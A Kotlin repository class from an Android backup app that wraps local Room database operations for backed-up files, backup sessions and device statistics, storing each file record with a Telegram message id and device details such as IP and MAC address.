package com.service.assasinscreed02.repository

import com.service.assasinscreed02.database.*
import com.service.assasinscreed02.DeviceInfo
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import android.content.Context
import android.util.Log

class BackupRepository(private val context: Context) {
    private val database = BackupDatabase.getDatabase(context)
    private val backupFileDao = database.backupFileDao()
    private val backupSessionDao = database.backupSessionDao()
    private val deviceStatsDao = database.deviceStatsDao()
    
    companion object {
        private const val TAG = "BackupRepository"
    }
    
    // BackupFile operations
    fun getAllFiles(): Flow<List<BackupFile>> = backupFileDao.getAllFiles()
    
    fun getFilesByStatus(status: String): Flow<List<BackupFile>> = backupFileDao.getFilesByStatus(status)
    
    fun getFilesByType(type: String): Flow<List<BackupFile>> = backupFileDao.getFilesByType(type)
    
    suspend fun insertFile(file: BackupFile): Long = withContext(Dispatchers.IO) {
        try {
            backupFileDao.insertFile(file)
        } catch (e: Exception) {
            Log.e(TAG, "Error inserting file: ${e.message}")
            -1L
        }
    }

    suspend fun insertFileWithDeviceInfo(
        fileName: String,
        filePath: String,
        fileHash: String,
        fileSize: Long,
        fileType: String,
        uploadStatus: String = "success",
        telegramMessageId: String? = null,
        errorMessage: String? = null
    ): Long = withContext(Dispatchers.IO) {
        try {
            val deviceInfo = DeviceInfo(context).getDeviceData()
            val backupFile = BackupFile(
                fileName = fileName,
                filePath = filePath,
                fileHash = fileHash,
                fileSize = fileSize,
                fileType = fileType,
                uploadStatus = uploadStatus,
                telegramMessageId = telegramMessageId,
                errorMessage = errorMessage,
                deviceId = deviceInfo.deviceId,
                deviceName = deviceInfo.deviceName,
                deviceIp = deviceInfo.ipAddress,
                deviceMac = deviceInfo.macAddress,
                deviceModel = deviceInfo.model,
                deviceManufacturer = deviceInfo.manufacturer,
                androidVersion = deviceInfo.androidVersion
            )
            backupFileDao.insertFile(backupFile)
        } catch (e: Exception) {
            Log.e(TAG, "Error inserting file with device info: ${e.message}")
            -1L
        }
    }
    
    suspend fun updateFile(file: BackupFile) = withContext(Dispatchers.IO) {
        try {
            backupFileDao.updateFile(file)
        } catch (e: Exception) {
            Log.e(TAG, "Error updating file: ${e.message}")
        }
    }
    
    suspend fun getFileByHash(hash: String): BackupFile? = withContext(Dispatchers.IO) {
        try {
            backupFileDao.getFileByHash(hash)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting file by hash: ${e.message}")
            null
        }
    }
    
    suspend fun getSuccessfulBackupsCount(): Int = withContext(Dispatchers.IO) {
        try {
            backupFileDao.getSuccessfulBackupsCount()
        } catch (e: Exception) {
            Log.e(TAG, "Error getting successful backups count: ${e.message}")
            0
        }
    }
    
    suspend fun getFailedBackupsCount(): Int = withContext(Dispatchers.IO) {
        try {
            backupFileDao.getFailedBackupsCount()
        } catch (e: Exception) {
            Log.e(TAG, "Error getting failed backups count: ${e.message}")
            0
        }
    }
    
    suspend fun getTotalBackupSize(): Long = withContext(Dispatchers.IO) {
        try {
            backupFileDao.getTotalBackupSize() ?: 0L
        } catch (e: Exception) {
            Log.e(TAG, "Error getting total backup size: ${e.message}")
            0L
        }
    }
    
    suspend fun deleteOldFiles(timestamp: Long) = withContext(Dispatchers.IO) {
        try {
            backupFileDao.deleteOldFiles(timestamp)
        } catch (e: Exception) {
            Log.e(TAG, "Error deleting old files: ${e.message}")
        }
    }
    
    // BackupSession operations
    fun getAllSessions(): Flow<List<BackupSession>> = backupSessionDao.getAllSessions()
    
    fun getSessionsByStatus(status: String): Flow<List<BackupSession>> = backupSessionDao.getSessionsByStatus(status)
    
    fun getSessionsByType(type: String): Flow<List<BackupSession>> = backupSessionDao.getSessionsByType(type)
    
    suspend fun insertSession(session: BackupSession): Long = withContext(Dispatchers.IO) {
        try {
            backupSessionDao.insertSession(session)
        } catch (e: Exception) {
            Log.e(TAG, "Error inserting session: ${e.message}")
            -1L
        }
    }
    
    suspend fun updateSession(session: BackupSession) = withContext(Dispatchers.IO) {
        try {
            backupSessionDao.updateSession(session)
        } catch (e: Exception) {
            Log.e(TAG, "Error updating session: ${e.message}")
        }
    }
    
    suspend fun getSessionById(sessionId: Long): BackupSession? = withContext(Dispatchers.IO) {
        try {
            backupSessionDao.getSessionById(sessionId)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting session by id: ${e.message}")
            null
        }
    }
    
    suspend fun getCompletedSessionsCount(): Int = withContext(Dispatchers.IO) {
        try {
            backupSessionDao.getCompletedSessionsCount()
        } catch (e: Exception) {
            Log.e(TAG, "Error getting completed sessions count: ${e.message}")
            0
        }
    }
    
    // DeviceStats operations
    fun getRecentStats(limit: Int = 100): Flow<List<DeviceStats>> = deviceStatsDao.getRecentStats(limit)
    
    suspend fun insertStats(stats: DeviceStats) = withContext(Dispatchers.IO) {
        try {
            deviceStatsDao.insertStats(stats)
        } catch (e: Exception) {
            Log.e(TAG, "Error inserting stats: ${e.message}")
        }
    }
    
    suspend fun getLatestStats(): DeviceStats? = withContext(Dispatchers.IO) {
        try {
            deviceStatsDao.getLatestStats()
        } catch (e: Exception) {
            Log.e(TAG, "Error getting latest stats: ${e.message}")
            null
        }
    }
    
    suspend fun deleteOldStats(timestamp: Long) = withContext(Dispatchers.IO) {
        try {
            deviceStatsDao.deleteOldStats(timestamp)
        } catch (e: Exception) {
            Log.e(TAG, "Error deleting old stats: ${e.message}")
        }
    }
    
    // Utility methods
    suspend fun getBackupStatistics(): Map<String, Any> = withContext(Dispatchers.IO) {
        try {
            val successfulCount = getSuccessfulBackupsCount()
            val failedCount = getFailedBackupsCount()
            val totalSize = getTotalBackupSize()
            val completedSessions = getCompletedSessionsCount()
            
            mapOf(
                "successfulBackups" to successfulCount,
                "failedBackups" to failedCount,
                "totalSize" to totalSize,
                "completedSessions" to completedSessions,
                "successRate" to if (successfulCount + failedCount > 0) {
                    (successfulCount.toFloat() / (successfulCount + failedCount) * 100).toInt()
                } else 0
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error getting backup statistics: ${e.message}")
            mapOf(
                "successfulBackups" to 0,
                "failedBackups" to 0,
                "totalSize" to 0L,
                "completedSessions" to 0,
                "successRate" to 0
            )
        }
    }
} 